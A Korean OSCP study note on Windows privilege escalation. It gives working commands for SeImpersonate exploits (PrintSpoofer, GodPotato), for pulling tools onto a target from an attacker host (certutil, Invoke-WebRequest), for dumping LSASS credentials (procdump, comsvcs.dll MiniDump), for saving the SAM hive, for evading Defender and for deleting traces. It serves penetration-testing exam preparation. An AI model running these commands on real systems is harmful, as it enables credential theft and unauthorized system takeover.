# 종합 실습 시나리오 + 도구 운용 (OSCP 기준)

## 시나리오

### 시나리오 A: 웹쉘(IIS AppPool) → SeImpersonatePrivilege 발견

```powershell
C:\temp\PrintSpoofer64.exe -i -c "whoami"
```

#### 플래그 수집

```powershell
type C:\Users\Administrator\Desktop\proof.txt
dir C:\Users\*\Desktop\local.txt C:\Users\*\Desktop\proof.txt
```

### 시나리오 B: MSSQL `xp_cmdshell` (mssqlserver 계정) → SeImpersonatePrivilege 발견

```powershell
C:\temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

### 시나리오 C: 로컬 관리자 쉘 → SeDebugPrivilege 발견

- 01 문서 순서대로 `procdump -ma lsass.exe` → Kali에서 `pypykatz`로 자격 증명 추출

- 같은 패스워드 재사용 여부 확인 후 측면 이동

## 도구 준비 체크리스트

- `PrintSpoofer64.exe` / `PrintSpoofer32.exe`
- `GodPotato-NET4.exe`
- `SweetPotato.exe`
- `JuicyPotato.exe` + OS별 CLSID 목록
- `procdump.exe` (Sysinternals)
- Kali의 `pypykatz` (타겟에 mimikatz 올리지 않는다)
- `nc.exe` 또는 PowerShell 리버스쉘 원라이너

## 도구 바이너리 준비 (Kali)

Kali 경량/미니멀 설치에는 Windows용 바이너리가 기본 포함되지 않으므로 별도로 준비한다.

### 1. apt (windows-resources 패키지)

```bash
sudo apt update
sudo apt install -y windows-resources
```

- 설치 경로: `/usr/share/windows-resources/binaries/` (일부 환경에서는 `/usr/share/seclists/` 하위)
- 해당 경로에서 `PrintSpoofer.exe` 등 Windows용 익스플로잇/보조 바이너리 존재 확인
- HTTP 서버로 서빙할 작업 디렉토리로 복사:

```bash
cp /usr/share/windows-resources/binaries/PrintSpoofer64.exe /tmp/
cd /tmp && python3 -m http.server 8000
```

### 2. 직접 다운로드 (Git Clone)

패키지 설치가 원활하지 않거나 최신 버전이 필요할 때:

```bash
git clone https://github.com/itm4n/PrintSpoofer.git
```

- 공식 저장소: https://github.com/itm4n/PrintSpoofer

### 도구별 획득 출처 (Kali, 오프라인 전개용)

| 도구 | 용도 | 획득 방법 |
|---|---|---|
| `PrintSpoofer64.exe` | SeImpersonate (신OS) | `apt install windows-resources` → `/usr/share/windows-resources/binaries/` 또는 git clone itm4n/PrintSpoofer |
| `GodPotato-NET4.exe` | SeImpersonate (폭넓음) | `windows-resources` 또는 GitHub (BeichenDream/GodPotato) |
| `SweetPotato.exe` | SeImpersonate 올인원 | GitHub (CCob/SweetPotato) |
| `JuicyPotato.exe` | 구OS SeImpersonate | GitHub (ohpe/juicy-potato) |
| `procdump.exe` | LSASS 덤프 | Sysinternals (Microsoft) 다운로드 |
| `nc.exe` | 리버스쉘 | `windows-resources` 또는 ncat for Windows |

## 도구 운용 방식 (OSCP 기준)

- 타겟에 인스톨러를 돌리는 게 아니라 Kali에서 준비한 단일 exe를 업로드해서 실행만 한다
- 타겟은 보통 인터넷이 안 되므로 Kali를 http 서버로 열어 전송한다

### Kali HTTP 서버 열기

```bash
python3 -m http.server 8000
```

### 타겟 전송: `certutil` 방식 (출력으로 성공 확인 가능)

```powershell
certutil -urlcache -split -f http://KALI_IP:8000/PrintSpoofer64.exe C:\temp\ps.exe
```

### 타겟 전송: `IWR` 방식 (출력 없음 → 별도 검증 필요)

```powershell
$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -TimeoutSec 20 http://KALI_IP:8000/GodPotato-NET4.exe -OutFile C:\temp\gp.exe
Get-Item C:\temp\gp.exe
```

### 실행 위치 (쓰기 가능한 임시 폴더만 사용)

- `C:\temp`, `C:\Windows\Temp`, `C:\Users\Public`

#### 현재 사용자 Temp 확인

```powershell
$env:TEMP
```

### 흔적 제거

```powershell
Remove-Item C:\temp\ps.exe, C:\temp\gp.exe -Force
```

### mimikatz 운용

- 타겟에서 직접 돌리지 말고 덤프만 빼온다
- 이유: Defender에 즉시 탐지/삭제된다
- 정석: 타겟에서 `procdump -ma lsass.exe` → dmp만 Kali로 가져오기 → Kali에서 `pypykatz`로 분석

### exe 차단 시 대체 (Living-off-the-land, 파일 전송 불필요)

#### LSASS 덤프

```powershell
$p = (Get-Process -Name lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\temp\lsass.dmp full
```

- 리버스쉘: `nc.exe` 대신 PowerShell 원라이너 (파일 전송 불필요)
  SAM/SYSTEM: `reg save`는 윈도우 내장 명령이라 전송 불필요

```powershell
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```
